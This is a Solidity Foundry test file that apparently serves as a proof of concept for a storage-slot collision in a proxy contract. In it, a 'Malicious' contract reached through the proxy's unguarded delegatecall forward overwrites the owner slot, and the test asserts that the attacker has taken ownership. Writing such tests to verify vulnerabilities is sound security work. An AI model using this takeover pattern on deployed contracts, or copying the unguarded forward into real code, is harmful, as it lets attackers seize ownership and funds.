// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

contract Malicious {
    address public owner;
    
    function hijackStorage() public {
        // Hijacks storage slot 0 when called via delegatecall
        owner = msg.sender;
    }
}

contract ProxyStorageCollisionTest is Test {
    Proxy public proxy;
    Malicious public malicious;
    address public user = makeAddr("user");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy proxy with test contract as initial owner
        proxy = new Proxy();
        
        // Deploy malicious contract
        malicious = new Malicious();
    }
    
    function testStorageHijackViaDelegateCall() public {
        console.log("--- BEFORE-Trigger Storage State ---");
        (uint preTxCount, uint preUserTxCount, address preOwner) = getStorageSlots();
        console.log("Pre-owner:", preOwner);
        console.log("Pre-txCount:", preTxCount);
        console.log("Pre-userTxCount:", preUserTxCount);
        
        // Confirm initial state
        assertEq(preOwner, address(this), "Initial owner mismatch");
        assertEq(preTxCount, 0, "Initial tx count should be 0");
        assertEq(preUserTxCount, 0, "Initial user tx count should be 0");

        console.log("--- Trigger Attacker Action ---");
        // Execute malicious delegatecall as attacker
        vm.startPrank(attacker);
        proxy.forward(
            address(malicious),
            abi.encodeWithSelector(malicious.hijackStorage.selector)
        );
        vm.stopPrank();

        console.log("--- AFTER-Trigger Storage State ---");
        (uint postTxCount, uint postUserTxCount, address postOwner) = getStorageSlots();
        console.log("Post-owner:", postOwner);
        console.log("Post-txCount:", postTxCount);
        console.log("Post-userTxCount:", postUserTxCount);
        
        // Vulnerability verification based on state changes
        if (postOwner == attacker) {
            console.log("VULNERABILITY VERIFIED: Owner changed to attacker");
            console.log("Vulnerability Exists: Malicious delegatecall successfully hijacked proxy storage (slot0 conflict)");
        } else {
            console.log("SAFETY VERIFIED: Owner remains unchanged");
            console.log("Vulnerability not Exist: Storage slot0 collision exploit failed");
        }

        // Original validations remain for completeness
        assertEq(postOwner, attacker, "Hijack failed - owner not changed");
        assertEq(postTxCount, 1, "Tx count not incremented");
        assertEq(postUserTxCount, 0, "User tx count improperly incremented");
    }
    
    function getStorageSlots() private view returns (uint, uint, address) {
        // Read raw storage slots
        bytes32 slot0 = vm.load(address(proxy), bytes32(0));     // owner
        bytes32 slot1 = vm.load(address(proxy), bytes32(uint(1))); // totalTransactions
        
        // Extract userTransactionCount from designated slot
        bytes32 userSlot = keccak256(abi.encode(user, uint(2)));
        uint userTxCount = uint(vm.load(address(proxy), userSlot));
        
        return (
            uint(slot1),                 // totalTransactions
            userTxCount,                 // userTransactionCount[user]
            address(uint160(uint(slot0))) // owner
        );
    }
}